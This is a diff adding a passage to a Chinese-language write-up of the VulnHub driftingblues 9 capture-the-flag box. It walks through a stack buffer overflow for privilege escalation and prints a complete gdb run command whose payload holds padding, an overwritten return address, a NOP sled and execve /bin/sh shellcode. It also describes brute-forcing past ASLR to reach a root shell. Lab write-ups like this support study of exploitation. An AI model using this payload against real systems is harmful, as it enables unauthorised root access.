@@ -209,3 +209,11 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffccd0:     '\220' <repeats 200 times>...
 (gdb) 
 ```
+之后，我检查了 esp 寄存器，并由于小端字节序而用相反顺序的esp地址(由于此时esp地址存储的是下一跳地址，所以还有一种方法二，这个地址话可以填成jmp esp指令的地址（[VulnHub-driftingblues:9\_driftingblues9-CSDN博客](https://blog.csdn.net/qq_32261191/article/details/117908644)）)替换了 4 个 B。之后，我在 nop sled 之后添加了 shell。我的最终输入如下：
+
+```c
+run $(python2 -c 'print "A" * 171 + "\xd0\xcc\xff\xff" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')
+```
+我也在目标机器上重复了相同的过程。但是，目标上的 ASLR 已启用，如果没有 root 权限，我们无法禁用它。因此，我们必须多次迭代相同的代码行。
+我替换了之前有效负载中的地址并运行了 for 循环
+经过两次不同的尝试，我得到了 root shell 和 flag
